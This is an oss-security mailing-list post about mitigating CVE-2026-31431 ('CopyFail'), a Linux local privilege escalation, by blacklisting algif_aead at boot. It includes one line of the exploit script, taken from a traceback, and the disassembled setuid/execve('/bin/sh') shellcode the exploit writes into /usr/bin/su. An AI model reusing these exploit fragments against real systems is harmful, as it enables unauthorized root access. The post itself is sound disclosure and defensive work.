Received: (qmail 30603 invoked by uid 550); 30 Apr 2026 01:52:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 29853 invoked from network); 30 Apr 2026 01:52:46 -0000
Date: Thu, 30 Apr 2026 03:52:33 +0200
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Message-ID: <20260430015233.GA24812@openwall.com>
References: <afJorKIje4O6dXbH@netmeister.org> <871pfxpf0v.fsf@gentoo.org> <afKs-tphZDvl3GIX@panix.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <afKs-tphZDvl3GIX@panix.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] CVE-2026-31431: CopyFail: linux local privilege scalation

On Wed, Apr 29, 2026 at 09:14:34PM -0400, Zube wrote:
> > > # echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
> > > # rmmod algif_aead 
> > 
> > Brad Spengler has been pointing out that this won't work on a few common
> > enterprise kernels where CONFIG_CRYPTO_USER_API_AEAD=y (rather than m).
> 
> An initial test of adding:
> 
> initcall_blacklist=algif_aead_init
> 
> to the kernel command line and rebooting seems to block the exploit.

Yes, and this was also shared on Mattermost channels of Rocky Linux by
user Curious:

> Looks like:
> grubby --update-kernel=ALL --args="initcall_blacklist=algif_aead_init"
> 
> and reboot does the job.
> 
> After you run your grubby command and reboot, you should verify that the argument was applied and the feature is inactive.
> 
> Check boot arguments:
> cat /proc/cmdline
>     (Look for initcall_blacklist=algif_aead_init in the string).

I confirm the above worked for me on Rocky Linux 9.7.  The exploit
copy_fail_exp.py worked before the above change, but fails as follows
after the change:

$ python3.11 copy_fail_exp.py
Traceback (most recent call last):
  File "/home/user/CVE-2026-31431/copy_fail_exp.py", line 9, in <module>
    while i<len(e):c(f,i,e[i:i+4]);i+=4
                   ^^^^^^^^^^^^^^^
  File "/home/user/CVE-2026-31431/copy_fail_exp.py", line 5, in c
    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory

Another curious detail is the exploit needs Python newer than EL9
installs by default, which might slow down some script kiddies a little
bit.  The above Python 3.11 worked (before the mitigation), but Rocky
Linux 9.7's default install of 3.9 did not (has no os.splice).

Here's what the exploit puts in /usr/bin/su when successful:

0x0000000000400078:  xor    %eax,%eax
0x000000000040007a:  xor    %edi,%edi
0x000000000040007c:  mov    $0x69,%al
0x000000000040007e:  syscall
0x0000000000400080:  lea    0xf(%rip),%rdi        # 0x400096
0x0000000000400087:  xor    %esi,%esi
0x0000000000400089:  push   $0x3b
0x000000000040008b:  pop    %rax
0x000000000040008c:  cltd
0x000000000040008d:  syscall
0x000000000040008f:  xor    %edi,%edi
0x0000000000400091:  push   $0x3c
0x0000000000400093:  pop    %rax
0x0000000000400094:  syscall

The syscalls are setuid(), execve(), exit().

(gdb) print (char *)0x400096
$1 = 0x400096 "/bin/sh"

Alexander
